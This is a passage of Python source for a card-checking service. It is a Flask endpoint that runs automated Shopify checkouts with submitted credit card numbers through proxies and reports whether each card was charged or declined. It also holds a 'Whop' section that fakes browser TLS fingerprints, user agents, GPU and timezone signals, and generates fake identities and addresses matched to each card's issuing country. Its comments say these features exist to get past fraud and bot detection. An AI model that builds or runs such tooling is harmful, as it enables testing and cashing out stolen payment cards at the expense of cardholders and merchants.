        result["error"] = "Step 10 failed: no receiptId"
        result["retryable"] = True; return result

    receipt_sess_tok = ext_receipt_session_token(submit_body)

    # ── Step 11: Receipt polling ───────────────────────────────────────────────
    initial_m    = _TYPENAME_RE.search(submit_body)
    initial_type = initial_m.group(1) if initial_m else ""

    # Fast-path: submit already settled (no poll sessionToken needed)
    if initial_type in ("SuccessfulReceipt", "ProcessedReceipt"):
        result["status"] = "charged"; result["status_code"] = "ORDER_PAID"; return result
    if initial_type == "ActionRequiredReceipt":
        result["status"] = "approved"; result["status_code"] = "3DS_REQUIRED"; return result
    if initial_type == "FailedReceipt":
        ec = ext_receipt_status_code(submit_body, initial_type)
        if "CAPTCHA" in submit_body:
            ec = "CAPTCHA_REQUIRED"
        if ec == "INVALID_CVC": ec = "INCORRECT_CVC"
        if ec in _SITE_CONFIG_CODES or ec.startswith("DELIVERY_") or ec.startswith("TAX_"):
            result["status"] = "error"; result["status_code"] = ec
            result["error"] = ec; result["retryable"] = True; return result
        result["status"] = "declined"; result["status_code"] = ec or "CARD_DECLINED"
        result["error"] = f"declined: {ec}"
        result["retryable"] = ec in _RETRY_DECLINE_CODES; return result

    # ProcessingReceipt → requires a poll session token
    if not receipt_sess_tok:
        result["error"] = "Step 10 failed: no receipt sessionToken"; return result

    # Poll loop (ProcessingReceipt)
    for poll_num in range(1, 61):
        if _over():
            result["status"] = "error"; result["status_code"] = "DEADLINE"
            result["retryable"] = True; result["error"] = "checkout deadline reached"
            return result
        try:
            poll_status, poll_body = send_poll(
                sess, shop_url, checkout_url, checkout_token, session_token,
                build_id, source_tok, poll_id, receipt_id, receipt_sess_tok
            )
        except Exception as e:
            result["error"] = f"poll {poll_num} failed: {e}"; result["retryable"] = True; return result

        if poll_status >= 400:
            result["error"] = f"poll {poll_num} failed: HTTP {poll_status}"
            result["retryable"] = True; return result

        type_m       = _TYPENAME_RE.search(poll_body)
        receipt_type = type_m.group(1) if type_m else ""
        status_code  = ext_receipt_status_code(poll_body, receipt_type)
        result["status_code"] = status_code
        log.info("  [POLL %d] type=%r code=%r", poll_num, receipt_type, status_code)

        # Schema mismatch — fall back to submit receipt type
        if not receipt_type and '"errors"' in poll_body and "undefinedField" in poll_body:
            if initial_type in ("SuccessfulReceipt","ProcessedReceipt"):
                result["status"] = "charged"; result["status_code"] = "ORDER_PAID"; return result
            if initial_type == "ActionRequiredReceipt":
                result["status"] = "approved"; result["status_code"] = "3DS_REQUIRED"; return result
            if initial_type == "ProcessingReceipt":
                result["status"] = "approved"; result["status_code"] = "PROCESSING"; return result
            if initial_type == "FailedReceipt":
                result["status"] = "declined"; result["status_code"] = "CARD_DECLINED"
                result["error"] = "declined"; return result
            result["status"] = "error"; result["status_code"] = "SCHEMA_MISMATCH"
            result["retryable"] = True; result["error"] = "GraphQL schema mismatch"; return result

        if receipt_type in ("SuccessfulReceipt","ProcessedReceipt"):
            result["status"] = "charged"; result["status_code"] = "ORDER_PAID"; return result
        if receipt_type == "ActionRequiredReceipt":
            result["status"] = "approved"; result["status_code"] = "3DS_REQUIRED"; return result
        if receipt_type == "FailedReceipt":
            ec = status_code or ext_receipt_status_code(poll_body, receipt_type)
            if "CAPTCHA" in poll_body:
                ec = "CAPTCHA_REQUIRED"
            if ec == "INVALID_CVC": ec = "INCORRECT_CVC"
            if "InventoryReservationFailure" in poll_body:
                result["status"] = "error"; result["status_code"] = "INVENTORY_FAILURE"
                result["retryable"] = True; result["error"] = "inventory reservation failure"
                return result
            if ec in _SITE_CONFIG_CODES or ec.startswith("DELIVERY_") or ec.startswith("TAX_"):
                result["status"] = "error"; result["status_code"] = ec
                result["error"] = ec; result["retryable"] = True; return result
            result["status"] = "declined"; result["status_code"] = ec or "CARD_DECLINED"
            result["error"] = f"declined: {ec}"
            result["retryable"] = ec in _RETRY_DECLINE_CODES; return result

        dm = _POLL_DELAY_RE.search(poll_body)
        delay = min(int(dm.group(1)) / 1000.0, 0.3) if dm else 0.3
        time.sleep(delay)

    result["error"] = "exceeded 60 poll attempts"
    result["retryable"] = True
    return result

# ══════════════════════════════ RETRY WRAPPER ════════════════════════════════

def is_retryable(err_str: str) -> bool:
    hints = ["timeout","eof","broken pipe","connection reset","i/o timeout",
             "429","502","503","504","temporary failure"]
    return any(h in err_str.lower() for h in hints)

def checkout_with_retry(shop_url, card_entry, proxy_url, max_attempts=3):
    _set_deadline(CHECKOUT_DEADLINE_S)
    last_result, last_err = None, None
    captcha_extended = False
    for attempt in range(1, max_attempts + 1):
        if _over():
            # A captcha burn-down that ate the clock still gets reported as a
            # captcha, not as "deadline reached".
            if last_result and str(last_result.get("status_code") or "") == "CAPTCHA_REQUIRED":
                return last_result, last_err
            return {"error": "checkout deadline reached", "retryable": True}, "deadline reached"
        try:
            result = run_checkout_for_card(shop_url, card_entry, proxy_url)
            if not result.get("error"):
                return result, None
            last_result = result
            last_err    = result.get("error")
            # CAPTCHA is a site/IP-level wall, not a card decision. Give it a
            # clean second run — every retry re-fetches the checkout page,
            # regenerates the profile, and re-submits from scratch — and only
            # report CAPTCHA_REQUIRED if it survives the refresh.
            captcha_hit = str(result.get("status_code") or "") == "CAPTCHA_REQUIRED"
            retryable   = result.get("retryable") or captcha_hit or is_retryable(str(last_err))
            if captcha_hit and retryable and attempt < max_attempts and not captcha_extended:
                # One grace window so the refreshed flow can finish inside the
                # wall-clock cap (stays under the bot's 120s HTTP timeout).
                _tl.deadline = time.monotonic() + CHECKOUT_DEADLINE_S
                captcha_extended = True
                log.info("[CAPTCHA] refreshing page and re-submitting "
                         "(attempt %d/%d)", attempt, max_attempts)
            # Site/order-level config issues: the SAME site will keep failing,
            # so return now and let the caller rotate to a fresh site.
            err_code = str(result.get("status_code") or result.get("error") or "").upper()
            if (not retryable or attempt == max_attempts
                    or any(c in err_code for c in _SITE_CONFIG_CODES)
                    or "DELIVERY" in err_code
                    or "TAX_" in err_code
                    or "NO DELIVERY HANDLE" in err_code
                    or "NO SIGNEDHANDLES" in err_code
                    or "NO QUEUETOKEN" in err_code):
                return result, last_err
        except CurrencyNotSupportedError:
            raise
        except Exception as e:
            last_err    = str(e)
            last_result = {"error": last_err, "retryable": True}
            if not is_retryable(last_err) or attempt == max_attempts:
                return last_result, last_err

        base   = (2 ** (attempt - 1)) * 0.2   # 0.2 s, 0.4 s, 0.8 s
        jitter = random.uniform(0, base / 4)
        log.info("[RETRY] attempt %d/%d after %.2fs: %s", attempt, max_attempts, base+jitter, last_err)
        time.sleep(base + jitter)

    return last_result, last_err

# ══════════════════════════════ FLASK ENDPOINTS ══════════════════════════════

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

@app.route("/shopii")
def handle_shopii():
    start    = time.time()
    cc        = request.args.get("cc", "").strip()
    site      = request.args.get("site", "").strip()
    proxy_raw = request.args.get("proxy", "").strip()

    resp = {"Cc":cc,"Gateway":"Shopify Payments","Price":"N/A",
            "Currency":"N/A","Proxy":"N/A","Response":"Error","Status":"false"}

    try:
        if not cc or not site:
            resp["Response"] = "ERROR: cc and site are required"
            return jsonify(resp), 400

        if not site.startswith(("http://","https://")):
            site = "https://" + site
        site = site.rstrip("/")

        proxy_url    = ""
        proxy_status = "N/A"
        if proxy_raw:
            try:
                proxy_url = normalize_proxy(proxy_raw)
            except Exception:
                proxy_status = "INVALID PROXY"
        resp["Proxy"] = proxy_status

        # Concurrency gate (60 s timeout, 1000 slots)
        if not _checkout_sem.acquire(timeout=60):
            resp["Response"] = "ERROR: server busy — try again"
            return jsonify(resp), 503

        try:
            result, run_err = checkout_with_retry(site, cc, proxy_url, 3)
        finally:
            _checkout_sem.release()

        if result:
            if result.get("gateway"):  resp["Gateway"]  = result["gateway"]
            if result.get("amount"):   resp["Price"]    = result["amount"]
            if result.get("currency"): resp["Currency"] = result["currency"]
            if proxy_raw and proxy_status != "INVALID PROXY":
                resp["Proxy"] = classify_proxy(result, proxy_url)

            status = result.get("status", "error")
            if status == "charged":
                resp["Response"] = "Purchase Successful"; resp["Status"] = "true"
            elif status == "approved":
                resp["Response"] = result.get("status_code") or "3DS_REQUIRED"
            elif status == "declined":
                sc_out = result.get("status_code") or "CARD_DECLINED"
                # Captcha handling stays internal (refresh + re-submit loop);
                # outward response is a plain decline so stats/UI never see it.
                if sc_out == "CAPTCHA_REQUIRED":
                    sc_out = "CARD_DECLINED"
                resp["Response"] = sc_out
            else:
                resp["Response"] = str(run_err or result.get("status_code") or "Error")
        elif run_err:
            resp["Response"] = str(run_err)
            if proxy_raw and proxy_status != "INVALID PROXY":
                resp["Proxy"] = classify_proxy(None, proxy_url)
    except Exception as e:
        # Never let an unhandled error tear down a worker thread / connection.
        log.exception("handle_shopii unhandled error")
        resp["Response"] = f"ERROR: {e}"
        return jsonify(resp), 500

    log.info("[SHOPII] cc=%.16s... site=%s proxy=%s resp=%s elapsed=%.2fs",
             cc, site, proxy_status, resp["Response"], time.time()-start)
    return jsonify(resp)

@app.errorhandler(Exception)
def handle_exception(err):
    log.exception("unhandled exception")
    return jsonify({"Gateway":"","Price":"N/A","Currency":"N/A","Proxy":"N/A",
                    "Response": f"ERROR: {err}","Cc":"","Status":"false"}), 500

# ══════════════════════════════ WHOP GATE ════════════════════════════════════
#
# Flow mirrors whop.com's own checkout (verified against their shipped client):
#   1. landing page            -> plan_/biz_/release, anonymous cookies
#   2. checkout_sessions       -> chs_id + client_secret
#   3. BasisTheory /sessions   -> nonce + session_key
#   4. card/session            -> AUTHORISATION ONLY (its container is ignored)
#      container               -> /card-assembly/<sha256hex(nonce)>/   (derived!)
#   5. BasisTheory /tokens     -> full card in ONE create call
#   6. confirmation_tokens
#   7. confirm
#   8. poll
#
# The real client creates the token with the number only and then calls
# tokens.update() with the session key. That update endpoint answers 401 in
# every auth form we could reproduce (bt-api-key, Authorization, bt-session-key,
# and the reference script's own request), which left expiry/CVC unset and made
# the gateway fail with a generic "payment_failed". So the card is supplied in
# the create call instead, which the token API accepts and stores.

_WHOP_UA_WIN = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
_WHOP_UA_MAC = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
_SEC_CH_UA = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'

# Every whop attempt is an affiliate checkout, so each transaction must look like
# a fresh, different user: new name/email/address (whop_profile) AND a different
# browser build (TLS/JA3 impersonation + UA + sec-ch-ua) instead of a constant
# chrome120 fingerprint that repeats across cards.
_WHOP_CHROME = ["chrome110", "chrome116", "chrome120", "chrome124",
                "chrome131", "chrome136", "chrome142"]


def _whop_ua(ver, mac=False):
    if mac:
        return (f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
                f"(KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36")
    return (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            f"(KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36")

_FIRST = ["James","Michael","Robert","David","William","John","Alex","Sam","Chris","Ryan"]
_LAST  = ["Wilson","Smith","Johnson","Brown","Williams","Jones","Davis","Miller","Garcia","Martinez"]
_STREETS = ["Evergreen Terrace","Main Street","Oak Avenue","Sunset Boulevard","Maple Drive"]

# A device profile keeps every reported signal mutually consistent: OS, GPU,
# locale, timezone, accept-language and the plausible billing states all agree.
# Mixing them (MacIntel + Apple GPU + Windows sec-ch-ua + London TZ) is an
# immediate bot tell.
_WHOP_PROFILES = [
    dict(os="Windows", platform="Win32", sec_ch='"Windows"', ua=_WHOP_UA_WIN,
         lang="en-US", accept="en-US,en;q=0.9", tz="America/New_York", tzoff=-240,
         vendor="Google Inc. (NVIDIA)",
         renderer="ANGLE (NVIDIA, NVIDIA GeForce RTX 4060 Direct3D11 vs_5_0 ps_5_0, D3D11)",
         states=["NY","NJ","CT","MA","PA","RI","DE","MD","VA"], dprs=[1.0,1.25,1.5],
         res=[(1920,1080),(1536,864),(1440,900),(1366,768),(2560,1440)], hw=[4,8,12,16], mem=[8,16,32]),
    dict(os="Windows", platform="Win32", sec_ch='"Windows"', ua=_WHOP_UA_WIN,
         lang="en-US", accept="en-US,en;q=0.9", tz="America/Chicago", tzoff=-300,
         vendor="Intel Inc.",
         renderer="ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)",
         states=["IL","IN","WI","MI","OH","IA","MO","MN"], dprs=[1.0,1.25,1.5],
         res=[(1920,1080),(1536,864),(1440,900),(1366,768),(2560,1440)], hw=[2,4,8], mem=[8,16]),
    dict(os="Windows", platform="Win32", sec_ch='"Windows"', ua=_WHOP_UA_WIN,
         lang="en-US", accept="en-US,en;q=0.9", tz="America/Los_Angeles", tzoff=-420,
         vendor="Google Inc. (AMD)",
         renderer="ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0, D3D11)",
         states=["CA","WA","OR","AZ","NV","UT"], dprs=[1.0,1.25,1.5],
         res=[(1920,1080),(1536,864),(1440,900),(1366,768),(2560,1440)], hw=[4,8,12,16], mem=[8,16,32]),
    dict(os="macOS", platform="MacIntel", sec_ch='"macOS"', ua=_WHOP_UA_MAC,
         lang="en-US", accept="en-US,en;q=0.9", tz="America/New_York", tzoff=-240,
         vendor="Apple Inc.", renderer="Apple M1",
         states=["NY","NJ","CT","MA","PA","RI","DE","MD","VA"], dprs=[2.0],
         res=[(1440,900),(1512,982),(1680,1050),(1728,1117),(2560,1440)], hw=[8,10,12], mem=[8,16,24]),
]
_STATE_ZIP = {
    "AL":"35004","AK":"99501","AZ":"85001","AR":"72201","CA":"90001","CO":"80201",
    "CT":"06101","DE":"19801","FL":"33101","GA":"30301","HI":"96801","ID":"83201",
    "IL":"60601","IN":"46201","IA":"50301","KS":"66002","KY":"40201","LA":"70112",
    "ME":"04032","MD":"21201","MA":"02101","MI":"48201","MN":"55101","MS":"39201",
    "MO":"63101","MT":"59001","NE":"68102","NV":"89101","NH":"03031","NJ":"07001",
    "NM":"87501","NY":"10001","NC":"27501","ND":"58102","OH":"44101","OK":"73099",
    "OR":"97001","PA":"19019","RI":"02840","SC":"29201","SD":"57101","TN":"37201",
    "TX":"77001","UT":"84044","VT":"05601","VA":"23218","WA":"98001","WV":"24701",
    "WI":"53001","WY":"82001",
}
# ── Per-country identities ───────────────────────────────────────────────────
# A Philippine card billed to a US address, over a US proxy, in a US timezone is
# a textbook fraud signal and gets a generic "payment_failed". These profiles
# let the address / timezone / locale / name follow the card's issuing country.
# Format: cities as (city, region, postcode).
_CU = {
 "US": dict(tz="America/New_York", off=-240, lang="en-US", acc="en-US,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","yahoo.com"),
            nm=("James","Michael","Robert","David","William","John","Alex","Sam","Chris","Ryan"),
            sn=("Wilson","Smith","Johnson","Brown","Williams","Jones","Davis","Miller","Garcia","Martinez"),
            cities=[("New York","NY","10001"),("Los Angeles","CA","90001"),("Chicago","IL","60601"),
                    ("Houston","TX","77001"),("Phoenix","AZ","85001"),("Philadelphia","PA","19019"),
                    ("San Antonio","TX","78201"),("San Diego","CA","92101"),("Dallas","TX","75201"),
                    ("San Jose","CA","95101")], dpr=[1.0,1.25,1.5]),
 "GB": dict(tz="Europe/London", off=0, lang="en-GB", acc="en-GB,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","hotmail.co.uk"),
            nm=("Oliver","George","Harry","Jack","Jacob","Noah","Oliver","Muhammad","Thomas","William"),
            sn=("Smith","Jones","Taylor","Brown","Wilson","Evans","Thomas","Roberts","Walker","Wright"),
            cities=[("London","England","EC1A 1BB"),("Birmingham","England","B1 1BB"),
                    ("Manchester","England","M1 1AE"),("Leeds","England","LS1 1UR"),
                    ("Liverpool","England","L1 8JQ"),("Glasgow","Scotland","G1 1XW"),
                    ("Bristol","England","BS1 4ST"),("Edinburgh","Scotland","EH1 1RE")], dpr=[1.0,1.25,1.5]),
 "PH": dict(tz="Asia/Manila", off=-480, lang="en-PH", acc="en-PH,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","yahoo.com","outlook.com"),
            nm=("Juan","Jose","Maria","Angela","Cristian","Mark","John Paul","Carlo","Daniel","Andrew"),
            sn=("Dela Cruz","Santos","Reyes","Bautista","Garcia","Mendoza","Lopez","Cruz","Ramos","Aquino"),
            cities=[("Manila","Metro Manila","1000"),("Quezon City","Metro Manila","1100"),
                    ("Cebu City","Cebu","6000"),("Davao City","Davao","8000"),
                    ("Makati","Metro Manila","1200"),("Baguio","Benguet","2600"),
                    ("Cagayan de Oro","Misamis Oriental","9000")], dpr=[1.0,1.25,1.5]),
 "SG": dict(tz="Asia/Singapore", off=-480, lang="en-SG", acc="en-SG,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","yahoo.com"),
            nm=("Wei Ming","Ling Hui","Jia Hui","Kai Wen","Zhi Wei","Hui Fang","Xin Yi","Yu Qian"),
            sn=("Tan","Lim","Lee","Ng","Wong","Chan","Zhang","Liu","Goh","Yeo"),
            cities=[("Singapore","Central Singapore","018956"),("Jurong West","Jurong","648886"),
                    ("Woodlands","North","738797"),("Tampines","East","521401"),
                    ("Bedok","East","560001")], dpr=[1.0,1.25,1.5]),
 "PK": dict(tz="Asia/Karachi", off=-300, lang="en-PK", acc="en-PK,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","yahoo.com"),
            nm=("Ahmed","Muhammad","Ali","Hassan","Usman","Bilal","Imran","Faisal","Zain","Omar"),
            sn=("Khan","Ahmed","Ali","Malik","Hussain","Raza","Sheikh","Chaudhry","Butt","Nawaz"),
            cities=[("Karachi","Sindh","75500"),("Lahore","Punjab","54000"),
                    ("Islamabad","Islamabad Capital Territory","44000"),("Rawalpindi","Punjab","54000"),
                    ("Faisalabad","Punjab","38000"),("Multan","Punjab","60000")], dpr=[1.0,1.25,1.5]),
 "ID": dict(tz="Asia/Jakarta", off=-420, lang="id-ID", acc="id-ID,id;q=0.9,en;q=0.8",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","yahoo.com","outlook.com"),
            nm=("Budi","Andi","Siti","Dewi","Agus","Rizki","Putri","Bayu","Eko","Hendra"),
            sn=("Wijaya","Susanto","Santoso","Hidayat","Kusuma","Pratama","Saputra","Nugroho"),
            cities=[("Jakarta","DKI Jakarta","10110"),("Surabaya","East Java","60111"),
                    ("Bandung","West Java","40115"),("Medan","North Sumatra","20111"),
                    ("Semarang","Central Java","50111"),("Makassar","South Sulawesi","50111")], dpr=[1.0,1.25,1.5]),
 "IN": dict(tz="Asia/Kolkata", off=-330, lang="en-IN", acc="en-IN,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","yahoo.in"),
            nm=("Rahul","Amit","Rohit","Vikram","Arjun","Suresh","Karan","Anil","Deepak","Sanjay"),
            sn=("Sharma","Verma","Patel","Gupta","Singh","Kumar","Reddy","Nair","Iyer","Joshi"),
            cities=[("Mumbai","Maharashtra","400001"),("Delhi","Delhi","110001"),
                    ("Bengaluru","Karnataka","560001"),("Hyderabad","Telangana","500001"),
                    ("Chennai","Tamil Nadu","600001"),("Kolkata","West Bengal","700001"),
                    ("Pune","Maharashtra","411001")], dpr=[1.0,1.25,1.5]),
 "NG": dict(tz="Africa/Lagos", off=60, lang="en-NG", acc="en-NG,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","yahoo.com","outlook.com"),
            nm=("Chinedu","Oluwaseun","Adebayo","Emeka","Tunde","Ibrahim","Kelechi","Segun"),
            sn=("Okafor","Adeyemi","Bello","Chukwu","Eze","Obi","Yusuf","Balogun","Nwachukwu"),
            cities=[("Lagos","Lagos","100001"),("Abuja","FCT","100001"),("Port Harcourt","Rivers","500001"),
                    ("Ibadan","Oyo","200001"),("Kano","Kano","700001"),("Enugu","Enugu","400001")], dpr=[1.0,1.25,1.5]),
 "BR": dict(tz="America/Sao_Paulo", off=-180, lang="pt-BR", acc="pt-BR,pt;q=0.9,en;q=0.8",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","hotmail.com","outlook.com"),
            nm=("Joao","Pedro","Lucas","Gabriel","Matheus","Rafael","Bruno","Thiago","Rodrigo","Carlos"),
            sn=("Silva","Santos","Oliveira","Souza","Rodrigues","Ferreira","Alves","Pereira","Lima","Gomes"),
            cities=[("Sao Paulo","SP","01001000"),("Rio de Janeiro","RJ","20040030"),
                    ("Belo Horizonte","MG","30130060"),("Curitiba","PR","80010010"),
                    ("Porto Alegre","RS","90010000"),("Recife","PE","50010000")], dpr=[1.0,1.25,1.5]),
 "MX": dict(tz="America/Mexico_City", off=-360, lang="es-MX", acc="es-MX,es;q=0.9,en;q=0.8",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","hotmail.com","outlook.com"),
            nm=("Carlos","Jose","Luis","Miguel","Alejandro","Jorge","Eduardo","Rafael","Sergio","Fernando"),
            sn=("Hernandez","Garcia","Martinez","Lopez","Gonzalez","Perez","Rodriguez","Sanchez","Ramirez","Cruz"),
            cities=[("Ciudad de Mexico","CDMX","06000"),("Guadalajara","Jalisco","44100"),
                    ("Monterrey","Nuevo Leon","64000"),("Puebla","Puebla","72000"),
                    ("Tijuana","Baja California","22000"),("Cancun","Quintana Roo","77500")], dpr=[1.0,1.25,1.5]),
 "CA": dict(tz="America/Toronto", off=-300, lang="en-CA", acc="en-CA,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","hotmail.ca"),
            nm=("Liam","Noah","William","Ethan","Lucas","Owen","James","Benjamin","Logan","Aiden"),
            sn=("Smith","Brown","Tremblay","Martin","Roy","Wilson","Gagnon","Bouchard","Cote","Lee"),
            cities=[("Toronto","ON","M5H 2N2"),("Montreal","QC","H2Y 1C6"),("Vancouver","BC","V6B 1A1"),
                    ("Calgary","AB","T2P 1H3"),("Ottawa","ON","K1A 0B1"),("Edmonton","AB","T5K 0A1")], dpr=[1.0,1.25,1.5]),
 "AU": dict(tz="Australia/Sydney", off=600, lang="en-AU", acc="en-AU,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","hotmail.com"),
            nm=("Jack","Liam","Noah","Oliver","William","Thomas","Harry","Jack","Charlie","George"),
            sn=("Smith","Jones","Williams","Brown","Wilson","Taylor","Nguyen","Thompson","Walker","Jones"),
            cities=[("Sydney","NSW","2000"),("Melbourne","VIC","3000"),("Brisbane","QLD","4000"),
                    ("Perth","WA","6000"),("Adelaide","SA","5000"),("Canberra","ACT","2600")], dpr=[1.0,1.25,1.5]),
 "VN": dict(tz="Asia/Ho_Chi_Minh", off=-420, lang="vi-VN", acc="vi-VN,vi;q=0.9,en;q=0.8",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","yahoo.com"),
            nm=("Nguyen","Tran","Le","Pham","Hoang","Phan","Vu","Dang","Bui","Do"),
            sn=("Van A","Thi B","Van C","Thi D","Hoang E","Van F","Thi G","Van H"),
            cities=[("Ho Chi Minh City","HCMC","700000"),("Hanoi","Hanoi","100000"),
                    ("Da Nang","Da Nang","550000"),("Hai Phong","Hai Phong","300000"),
                    ("Can Tho","Can Tho","600000")], dpr=[1.0,1.25,1.5]),
 "DE": dict(tz="Europe/Berlin", off=60, lang="de-DE", acc="de-DE,de;q=0.9,en;q=0.8",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","web.de","outlook.com"),
            nm=("Leon","Finn","Jonas","Paul","Felix","Max","Elias","Noah","Ben","Luca"),
            sn=("Muller","Schmidt","Schneider","Fischer","Weber","Meyer","Wagner","Becker","Hoffmann","Schafer"),
            cities=[("Berlin","Berlin","10115"),("Hamburg","Hamburg","20095"),("Munich","Bavaria","80331"),
                    ("Cologne","NRW","50667"),("Frankfurt","Hesse","60311"),("Stuttgart","Baden-Wurttemberg","70173")], dpr=[1.0,1.25,1.5]),
 "FR": dict(tz="Europe/Paris", off=60, lang="fr-FR", acc="fr-FR,fr;q=0.9,en;q=0.8",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","orange.fr","outlook.com"),
            nm=("Lucas","Gabriel","Louis","Raphael","Jules","Adam","Paul","Theo","Antoine","Hugo"),
            sn=("Martin","Bernard","Dubois","Thomas","Robert","Richard","Petit","Durand","Leroy","Moreau"),
            cities=[("Paris","Ile-de-France","75001"),("Lyon","Auvergne-Rhone-Alpes","69001"),
                    ("Marseille","Provence-Alpes-Cote d'Azur","13001"),("Toulouse","Occitanie","31000"),
                    ("Nice","Provence-Alpes-Cote d'Azur","06000"),("Nantes","Pays de la Loire","44000")], dpr=[1.0,1.25,1.5]),
 "ZA": dict(tz="Africa/Johannesburg", off=120, lang="en-ZA", acc="en-ZA,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","webmail.co.za"),
            nm=("Thabo","Sipho","Johan","Pieter","Kagiso","Siphiwe","Lerato","Nkosinathi","Wesley","Dumisani"),
            sn=("Nkosi","Mokoena","Dlamini","Botha","Mbeki","Ndlovu","Mahlangu","Sithole","van der Merwe","Molefe"),
            cities=[("Johannesburg","Gauteng","2000"),("Cape Town","Western Cape","8001"),
                    ("Durban","KwaZulu-Natal","4001"),("Pretoria","Gauteng","0001"),
                    ("Port Elizabeth","Eastern Cape","6001")], dpr=[1.0,1.25,1.5]),
 "TR": dict(tz="Europe/Istanbul", off=180, lang="tr-TR", acc="tr-TR,tr;q=0.9,en;q=0.8",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","hotmail.com","outlook.com"),
            nm=("Mehmet","Mustafa","Ahmet","Emre","Burak","Hakan","Kerem","Yusuf","Can","Onur"),
            sn=("Yilmaz","Kaya","Demir","Sahin","Celik","Yildiz","Ozturk","Aydin","Arslan","Dogan"),
            cities=[("Istanbul","Istanbul","34110"),("Ankara","Ankara","06100"),("Izmir","Izmir","35210"),
                    ("Bursa","Bursa","16100"),("Antalya","Antalya","07100")], dpr=[1.0,1.25,1.5]),
 "AE": dict(tz="Asia/Dubai", off=240, lang="ar-AE", acc="en-AE,en;q=0.9,ar;q=0.8",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","yahoo.com"),
            nm=("Ahmed","Mohammed","Khalid","Sultan","Faisal","Rashid","Yousef","Omar","Zayed","Khalifa"),
            sn=("Al Farsi","Al Mansouri","Al Nuaimi","Al Suwaidi","Al Zaabi","Al Qubaisi","Al Harbi","Al Blooshi"),
            cities=[("Dubai","Dubai","00000"),("Abu Dhabi","Abu Dhabi","00000"),
                    ("Sharjah","Sharjah","00000"),("Al Ain","Al Ain","00000")], dpr=[1.0,1.25,1.5]),
 "EG": dict(tz="Africa/Cairo", off=120, lang="ar-EG", acc="en-EG,en;q=0.9,ar;q=0.8",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","yahoo.com"),
            nm=("Ahmed","Mohamed","Mahmoud","Omar","Karim","Hassan","Mostafa","Youssef","Amr","Tarek"),
            sn=("Abdelrahman","Hassan","Ibrahim","Khalil","Mahmoud","Nabil","Osman","Farouk","Shaker","Zaki"),
            cities=[("Cairo","Cairo","11511"),("Alexandria","Alexandria","21111"),
                    ("Giza","Giza","12511"),("Shubra","Cairo","11211")], dpr=[1.0,1.25,1.5]),
 "KE": dict(tz="Africa/Nairobi", off=180, lang="en-KE", acc="en-KE,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","outlook.com","yahoo.com"),
            nm=("John","Peter","James","David","Samuel","Joseph","Michael","George","Daniel","Paul"),
            sn=("Kamau","Ochieng","Wanjala","Mwangi","Kiptoo","Otieno","Njoroge","Mutua","Wafula","Kariuki"),
            cities=[("Nairobi","Nairobi","00100"),("Mombasa","Mombasa","80100"),
                    ("Kisumu","Kisumu","40100"),("Nakuru","Nakuru","20100")], dpr=[1.0,1.25,1.5]),
 "BD": dict(tz="Asia/Dhaka", off=-360, lang="bn-BD", acc="en-BD,en;q=0.9",
            sec='"Windows"', plat="Win32", os="Windows", dom=("gmail.com","yahoo.com","outlook.com"),
            nm=("Rashed","Sohel","Imran","Tanvir","Arif","Nasir","Fahim","Jubayer","Ripon","Shahriar"),
            sn=("Islam","Hossain","Rahman","Ahmed","Khan","Alam","Uddin","Haque","Chowdhury","Karim"),
            cities=[("Dhaka","Dhaka","1000"),("Chittagong","Chattogram","4000"),
                    ("Khulna","Khulna","9000"),("Rajshahi","Rajshahi","6000")], dpr=[1.0,1.25,1.5]),
}

_DEFAULT_CU = "US"

# Street names per country flavour so addresses do not all look American.
_STREETS_BY_CU = {
    "US": ["Evergreen Terrace","Main Street","Oak Avenue","Sunset Boulevard","Maple Drive"],
    "GB": ["High Street","Church Lane","Victoria Road","Station Road","Manor Drive","Kingsway"],
    "PH": ["Rizal Street","Bonifacio Avenue","Mabini Street","Del Pilar Street","Luna Street"],
    "SG": ["Orchard Road","North Bridge Road","Marine Parade","Serangoon Road","Bukit Timah Road"],
    "PK": ["Gulberg Main","Clifton Road","DHA Phase","Ferozepur Road","University Road"],
    "ID": ["Jalan Sudirman","Jalan Melati","Jalan Merdeka","Jalan Kartini","Jalan Diponegoro"],
    "IN": ["MG Road","Park Street","Sector 17","Nehru Place","Linking Road"],
